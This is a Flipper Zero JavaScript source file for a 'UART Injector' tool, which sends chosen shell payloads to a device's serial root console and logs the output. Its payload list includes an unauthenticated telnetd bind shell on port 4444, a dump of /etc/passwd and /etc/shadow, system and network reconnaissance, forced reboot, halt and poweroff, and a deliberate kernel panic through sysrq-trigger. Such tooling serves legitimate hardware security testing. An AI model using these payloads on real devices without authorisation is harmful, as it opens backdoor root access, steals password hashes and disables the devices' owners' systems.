/*****************************************
 * 
 * Script: UART Injector
 * 
 * Author: Jaxhax-Travis
 * 
 * Repo: https://github.com/jaxhax-travis/flipper-js-uart-injector
 * 
 * Purpose: A script to use the Flipper Zero as a standalone UART
 *          command injector.  Wire it up, Select the baud rate and
 *          payload, and fire away.  This supports capturing the
 *          output from the commands and saving it to the SD card.
 * 
 * **************************************/
let eventLoop = require("event_loop");
let serial = require("serial");
let storage = require("storage");
let gui = require("gui");
let submenuView = require("gui/submenu");
let dialogView = require("gui/dialog");
let textBoxView = require("gui/text_box");
let textInputView = require("gui/text_input");

let version = "v1.1";

let log_folder = "/ext/apps_data/uart_injector";

/**
 * Flipper JS doesn't support the class so
 * an object generating function is a close
 * second.
 * */
function Payload(title, payload, post_func) {
    return {
        title: title,
        payload: payload,
        post_func : post_func
    };
}

////////////////////////////////////////////
// Post Payload handler functions
////////////////////////////////////////////
function postNOP() { 
    logAppend("Payload Sent!");
 }

function postReadUntilPrompt() {
    logAppend("Reading Output...");
    let console_resp = serial.readAny(2500);
    settings.buf = "";
    while ( console_resp !== undefined ) {
        logAppend(console_resp);
        settings.buf += console_resp;
        console_resp = serial.readAny(2500);
    }

    let offset = settings.buf.indexOf(settings.payload.payload);
    if (offset > 0) {
        settings.buf = settings.buf.substring(offset);
    }

    if (settings.buf.length === 0) {
        return
    }

    gui.viewDispatcher.switchTo(views.keyboard);
}

////////////////////////////////////////////
// Presented options for user selection
//     Edit these to your liking!
////////////////////////////////////////////
let BAUDRATES = [
    115200,
    9600,
    4800,
    19200,
    38400,
    57600,
    230400,
    460800,
    921600
];

let PAYLOADS = [
    Payload(
        "Bindsh 4444 - Telnetd",
        "telnetd -p 4444 -l /bin/sh",
        postNOP
    ),
    Payload(
        "Get passwd + shadow",
        'echo "---===[ /etc/passwd ]===---"; cat /etc/passwd; echo -e "\n---===[ /etc/shadow ]===---"; cat /etc/shadow',
        postReadUntilPrompt
    ),
    Payload(
        "Get MTD info",
        'for i in $(seq 0 100); do  if [ -d /sys/class/mtd/mtd${i} ]; then echo -e "---===[ /dev/mtd${i} - $(cat /sys/class/mtd/mtd${i}/name) ]===---"; echo -e "  [*] Type: $(cat /sys/class/mtd/mtd${i}/type)"; echo -e "  [*] Size: $(cat /sys/class/mtd/mtd${i}/size)\n"; fi; done;',
        postReadUntilPrompt
    ),
    Payload(
        "Get System info",
        'echo "\n\t---===[ System Info ]===---\n"; echo -e " [*] Hostname: $(hostname)"; echo -e " [*] Uname: $(uname -a)"; echo -e " [*] Cmdline: $(cat /proc/cmdline)"; echo -e " [*] Boardtype: $(cat /proc/board_type)"; echo -e "\n\n\t---===[ Network Info ]===---\n"; ifconfig; echo ""; netstat; echo -e "\n\n\t---===[ CPU and Memory ]===---\n"; cat /proc/cpuinfo; echo ""; cat /proc/meminfo; echo -e "\n\n\t---===[ Mounts ]===---\n"; mount; echo -e "\n\n\t---===[ Busybox Applets ]===---\n"; busybox --help; echo -e "\n\n\t---===[ Processes ]===---\n"; ps;',
        postReadUntilPrompt
    ),
    Payload(
        "Reboot",
        "reboot",
        postNOP
    ),
    Payload(
        "Reboot (Force)",
        "reboot -f",
        postNOP
    ),
    Payload(
        "Halt",
        "halt",
        postNOP
    ),
    Payload(
        "Halt (Force)",
        "halt -f",
        postNOP
    ),
    Payload(
        "Poweroff",
        "poweroff",
        postNOP
    ),
    Payload(
        "Poweroff (Force)",
        "poweroff -f",
        postNOP
    ),
    Payload(
        "Kernel Panic Device",
        "echo 'c' > /proc/sysrq-trigger",
        postReadUntilPrompt
    ),
];

let views = {
    pinoutDialog: dialogView.make(),
    baudrateSubmenu: submenuView.make(),
    payloadSubmenu: submenuView.make(),
    logTextBox: textBoxView.makeWith({
        text: "",
        focus: "end"
    }),
    keyboard: textInputView.make(),
    confirmDiscardDialog: dialogView.make(),
    fileExistDialog: dialogView.make(),
};

let settings = {
    baudrate: 0,
    payload: null,
    log: "",
    filepath: "",
    buf: ""
};

////////////////////////////////////////////
// Support functions for application
////////////////////////////////////////////
function logAppend(msg) {
    print(msg);
    settings.log += "\n" + msg;
    views.logTextBox.set("text", settings.log);
}

function createLogFolder() {
    if (!storage.directoryExists(log_folder)) {
        let result = storage.makeDirectory(log_folder);
        if (!result) {
            logAppend("Failed to create log directory");
            logAppend(log_folder);
            return
        }
    }
}

function saveData() {
    createLogFolder();
    if (settings.filepath.length === 0 ) {
        return;
    }
    let file = storage.openFile(settings.filepath, "w", "create_always");
    let result = file.write(settings.buf);
    file.close()

    if (result > 0) {
        logAppend("Saved to log file:");
        logAppend(settings.filepath)
    } else {
        logAppend("Failed to save file");
    }
    gui.viewDispatcher.switchTo(views.logTextBox);
}

function checkForPrompt() {
    logAppend("Check for Prompt...");
    serial.write([0x0a]);
    let console_resp = serial.expect("# ", 1000);
    if (console_resp === undefined) {
        logAppend("No CLI response");
        return false;
    }
    logAppend("Got prompt!");
    return true;
}

function injectCmd() {
    serial.setup("usart", settings.baudrate);

    if (!checkForPrompt()) {
        serial.end();
        return;
    }

    logAppend("Attempting to disable echo");
    serial.write("stty -echo\n");
    if (!checkForPrompt()) {
        serial.end();
        return;
    }

    logAppend("Sending Payload...");
    serial.write(settings.payload.payload + "\n");

    settings.payload.post_func();

    serial.end();
}

////////////////////////////////////////////
//             UI functions
////////////////////////////////////////////
function setupPinoutUI() {
    //    header: "UART Injector " + version,
    //    text: "Use Pins 13/14, select\nbaud rate & payload",
    //    center: "OK"
    views.pinoutDialog.set("center", "OK");
    views.pinoutDialog.set("text", "Use Pins 13/14, select\nbaud rate & payload");
    views.pinoutDialog.set("header", "UART Injector " + version);

    // Dialog displaying the pinout to the user.
    eventLoop.subscribe(views.pinoutDialog.input, function (_sub, button, gui, views) {
        if (button === "center")
            gui.viewDispatcher.switchTo(views.baudrateSubmenu);
    }, gui, views);
}

function setupBaudRateUI() {
    let baudrates = [];
    for (let i = 0; i < BAUDRATES.length; i++) {
        baudrates.push(BAUDRATES[i].toString());
    }
    
    views.baudrateSubmenu.set("items", baudrates);
    views.baudrateSubmenu.set("header", "Choose Baudrate");

    // Handle when a user chooses a baudrate.
    eventLoop.subscribe(views.baudrateSubmenu.chosen, function (_sub, index, gui, eventLoop, views) {
        settings.baudrate = BAUDRATES[index];
        gui.viewDispatcher.switchTo(views.payloadSubmenu);
    }, gui, eventLoop, views);
}

function setupPayloadUI() {
    let payloads = [];
    for (let i = 0; i < PAYLOADS.length; i++) {
        payloads.push(PAYLOADS[i].title);
    }
    views.payloadSubmenu.set("items", payloads);
    views.payloadSubmenu.set("header", "Select Payload");

    // Handle when a user chooses a payload.
    eventLoop.subscribe(views.payloadSubmenu.chosen, function (_sub, index, gui, eventLoop, views) {
        settings.payload = PAYLOADS[index];
        gui.viewDispatcher.switchTo(views.logTextBox);
        injectCmd();
    }, gui, eventLoop, views);
}

function setupKeyboardUI() {
    views.keyboard.set("defaultTextClear", true);
    views.keyboard.set("minLength", 0);
    views.keyboard.set("maxLength", 32);
    views.keyboard.set("defaultText", "uart_log.txt");
    views.keyboard.set("header", "LogFile Name");

    // say hi after keyboard input
    eventLoop.subscribe(views.keyboard.input, function (_sub, logfile, gui, views) {
        views.keyboard.set("defaultText", logfile);

        if (logfile === undefined || logfile === "") {
            return
        }

        if (logfile.indexOf(".txt") === -1) {
            logfile += ".txt";
        }
        views.keyboard.set("defaultText", logfile);

        if (storage.fileExists(log_folder + "/" + logfile)){
            gui.viewDispatcher.switchTo(views.fileExistDialog);
            return;
        }

        settings.filepath = log_folder + "/" + logfile;
        saveData();
    }, gui, views);
}

function setupconfirmDiscardDialog() {
    views.confirmDiscardDialog.set("text", "Do you want to discard data?");
    views.confirmDiscardDialog.set("left", "Yes");
    views.confirmDiscardDialog.set("right", "No");
    views.confirmDiscardDialog.set("header", "Exit without saving?");

    // Handle the users response to discarding without saving.
    eventLoop.subscribe(views.confirmDiscardDialog.input, function (_sub, button, gui, views) {
        if (button === "left")
            logAppend("Save aborted by user.")
            gui.viewDispatcher.switchTo(views.logTextBox);
        if (button === "right")
            gui.viewDispatcher.switchTo(views.keyboard);
    }, gui, views);
}

function setupFileExistDialog() {
    views.fileExistDialog.set("text", "Log File Exist");
    views.fileExistDialog.set("center", "Ok");
    views.fileExistDialog.set("header", "Error");

    // Handle the file exist inputs.
    eventLoop.subscribe(views.fileExistDialog.input, function (_sub, button, gui, views) {
        if (button === "center")
            gui.viewDispatcher.switchTo(views.keyboard);
    }, gui, views);
}

function configureBackNavigation() {
    // Handle back button presses depending on view.
    eventLoop.subscribe(gui.viewDispatcher.navigation, function (_sub, _, gui, views, eventLoop) {
        if (gui.viewDispatcher.currentView === views.pinoutDialog || gui.viewDispatcher.currentView === views.logTextBox) {
            eventLoop.stop();
            return;
        }
        if (gui.viewDispatcher.currentView === views.baudrateSubmenu) {
            gui.viewDispatcher.switchTo(views.pinoutDialog);
        }
        if (gui.viewDispatcher.currentView === views.payloadSubmenu) {
            gui.viewDispatcher.switchTo(views.baudrateSubmenu);
        }
        if (gui.viewDispatcher.currentView === views.keyboard) {
            gui.viewDispatcher.switchTo(views.confirmDiscardDialog);
        }
        if (gui.viewDispatcher === views.fileExistDialog) {
            gui.viewDispatcher.switchTo(views.keyboard);
        }
    }, gui, views, eventLoop);
}

////////////////////////////////////////////
// Main Code
////////////////////////////////////////////
setupPinoutUI();
setupBaudRateUI();
setupPayloadUI();
setupKeyboardUI();
setupconfirmDiscardDialog();
setupFileExistDialog();
configureBackNavigation();

// run UI
gui.viewDispatcher.switchTo(views.pinoutDialog);
eventLoop.run();